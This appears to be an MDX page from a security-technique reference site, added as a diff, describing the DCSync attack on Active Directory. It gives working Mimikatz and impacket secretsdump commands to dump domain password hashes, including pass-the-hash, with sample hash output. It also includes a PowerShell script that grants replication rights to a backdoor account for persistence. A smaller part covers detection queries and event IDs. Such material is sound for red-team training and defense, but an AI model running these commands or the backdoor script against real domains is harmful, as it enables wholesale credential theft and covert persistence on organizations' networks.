@@ -1,0 +1,207 @@
+---
+title: DCSync Attack
+mitre: T1003.006
+category: credential-access
+group: Active Directory Attacks
+summary: Impersonate a domain controller to pull every credential hash from AD using the MS-DRSR replication protocol.
+platform: [Windows]
+tags: ['C / C++', 'PowerShell', 'Active Directory', 'Mimikatz']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: verify DS-Replication rights
+    desc: GetChanges + GetChangesAll ACEs are required — held by DAs, DCs, and any account explicitly granted them.
+    dll: —
+  - call: DsGetDcName
+    desc: Locate a reachable domain controller to send replication requests to.
+    dll: netapi32
+  - call: IDL_DRSBind (RPC over TCP 135)
+    desc: Establish an authenticated RPC session to the MS-DRSR endpoint on the DC.
+    dll: ntdsapi
+  - call: IDL_DRSGetNCChanges
+    desc: Request replication data for a named user object — the DC returns the encrypted credential blob.
+    dll: ntdsapi
+  - call: decrypt credential blob
+    desc: The replication payload is session-key encrypted; Mimikatz decrypts it with the negotiated Kerberos session key.
+    dll: —
+detections:
+  - src: WINDOWS EID 4662
+    text: Object access on the domain NC with GUIDs for DS-Replication-Get-Changes-All ({1131f6ad-...}) from a non-DC account.
+  - src: NETWORK
+    text: MS-DRSR RPC (UUID e3514235-...) traffic sourced from a workstation or member server — only DCs replicate legitimately.
+  - src: BEHAVIOURAL
+    text: Mimikatz process with "DRSUAPI" in loaded imports, or lsadump::dcsync keyword in command line.
+  - src: WINDOWS EID 4768 / 4769
+    text: TGT request immediately followed by a replication RPC from the same non-DC source.
+related:
+  - mitre: T1003.003
+    title: NTDS.dit Extraction
+    desc: File-based alternative — requires VSS or physical access to the DC.
+    href: /techniques/credential-access/ntds-dit
+  - mitre: T1558.003
+    title: Kerberoasting
+    desc: Hash extraction via service tickets — no replication rights needed.
+    href: /techniques/credential-access/kerberoasting
+  - mitre: T1134.001
+    title: Token Impersonation
+    desc: Escalate to a DA token before invoking DCSync.
+    href: /techniques/credential-access/token-impersonation
+labKit:
+  - label: Mimikatz lsadump::dcsync
+    href: 'https://github.com/gentilkiwi/mimikatz'
+  - label: impacket secretsdump.py (remote DCSync)
+    href: 'https://github.com/fortra/impacket'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+DCSync is a credential-dumping technique that abuses the **MS-DRSR** (Directory Replication Service Remote Protocol) — the same mechanism domain controllers use to synchronise their AD databases. An attacker with the right ACEs issues `IDL_DRSGetNCChanges` RPC calls to a DC and receives back the same credential blob a secondary DC would receive during a normal replication cycle. No files are opened on disk, no processes are injected, and the DC never knows it is talking to an adversary rather than a peer.
+
+The attack surface is the `DS-Replication-Get-Changes-All` extended right on the domain NC object. Domain Admins and Enterprise Admins hold this right by default. The right can also be delegated — a common persistence mechanism is to grant it to a low-privileged account, making subsequent DCSync possible without DA membership.
+
+<Callout type="caution">
+  DCSync returns every credential in the domain in a single operation — NTLM hashes, AES Kerberos keys, and password history. On an engagement, document the finding and confirm scope before actually extracting hashes. Pulling the entire domain is rarely necessary to demonstrate impact.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Mimikatz (interactive)
+
+<CodeBlock
+  file="dcsync_mimikatz.txt"
+  label="Mimikatz"
+  lang="text"
+  class="mb-7.5"
+  code={`# Dump a single account (least-footprint approach)
+mimikatz # lsadump::dcsync /user:CORP\\Administrator
+
+# Dump krbtgt to build a Golden Ticket
+mimikatz # lsadump::dcsync /user:CORP\\krbtgt
+
+# Dump the entire domain (noisy — one RPC call per account)
+mimikatz # lsadump::dcsync /all /csv
+
+# Output:
+# [DC] 'corp.local' will be the domain
+# [DC] 'DC01.corp.local' will be the DC server
+# Object RDN           : Administrator
+# ** SAM ACCOUNT **
+#   SAM Username         : Administrator
+#   Object Security ID   : S-1-5-21-...
+#   Object Relative ID   : 500
+#   Credentials:
+#     Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
+#     ntlm- 0: 8846f7eaee8fb117ad06bdd830b7586c
+#   Supplemental Credentials:
+#     Primary:Kerberos-Newer-Keys aes256: ...`}
+/>
+
+### impacket secretsdump (remote, no local access needed)
+
+<CodeBlock
+  file="dcsync_impacket.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Remote DCSync from a Linux attack host — no footprint on the DC
+$ python3 secretsdump.py CORP/Administrator:'Password123!'@10.10.10.1 -just-dc
+
+# Dump only a single user
+$ python3 secretsdump.py CORP/Administrator:'Password123!'@10.10.10.1 \
+    -just-dc-user Administrator
+
+# Pass-the-hash to DCSync without cleartext password
+$ python3 secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c \
+    CORP/Administrator@10.10.10.1 -just-dc
+
+# Output (Domain\\user:RID:LMhash:NThash)
+CORP.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+CORP.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c1e75e0bef3d84f9c18cebc0...:::`}
+/>
+
+### Grant DCSync rights to a backdoor account (persistence)
+
+<CodeBlock
+  file="grant_dcsync.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Run as Domain Admin to grant DCSync rights to a low-priv account
+Import-Module ActiveDirectory
+
+$acl = Get-Acl "AD:\DC=corp,DC=local"
+
+# DS-Replication-Get-Changes-All GUID
+$guid1 = [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
+# DS-Replication-Get-Changes GUID
+$guid2 = [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
+
+$identity = [System.Security.Principal.NTAccount]"CORP\backdoor_svc"
+$adRights  = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
+$type      = [System.Security.AccessControl.AccessControlType]::Allow
+
+$acl.AddAccessRule(
+    (New-Object System.DirectoryServices.ActiveDirectoryAccessRule \`
+        $identity, $adRights, $type, $guid1, "None", [guid]::Empty))
+$acl.AddAccessRule(
+    (New-Object System.DirectoryServices.ActiveDirectoryAccessRule \`
+        $identity, $adRights, $type, $guid2, "None", [guid]::Empty))
+
+Set-Acl -AclObject $acl "AD:\DC=corp,DC=local"`}
+/>
+
+### Detect rogue DCSync grants (defensive)
+
+<CodeBlock
+  file="detect_dcsync_rights.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Find all accounts with DCSync rights that are NOT DCs or DA group members
+Import-Module ActiveDirectory
+
+$replicationGUID = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
+$domainDN = (Get-ADDomain).DistinguishedName
+
+$acl = Get-Acl "AD:\$domainDN"
+$acl.Access | Where-Object {
+    $_.ObjectType -eq [guid]$replicationGUID -and
+    $_.ActiveDirectoryRights -match "ExtendedRight"
+} | Select-Object IdentityReference, ActiveDirectoryRights`}
+/>
+
+## Rights required — and where to get them
+
+| Account type | Has DCSync rights by default |
+|---|---|
+| Domain Admin | Yes |
+| Enterprise Admin | Yes |
+| Domain Controller computer accounts | Yes |
+| `MSOL_*` (Azure AD Connect) | Yes — common target |
+| Backup Operators | No |
+| Standard domain user | No |
+
+Azure AD Connect service accounts (`MSOL_<random>`) are particularly valuable targets: they are automatically granted DCSync rights during Azure AD Connect installation, typically have a weak or auto-generated password, and often receive little monitoring attention.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+EID 4662 is the primary detection: look for the replication GUIDs on the domain NC object (`%{1131f6ad-...}`) from an account that is not a DC computer account. The challenge is volume — legitimate DCs generate thousands of 4662 events per day. Filter to `SubjectUserName` not ending in `$` (machine accounts) to eliminate legitimate replication noise.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
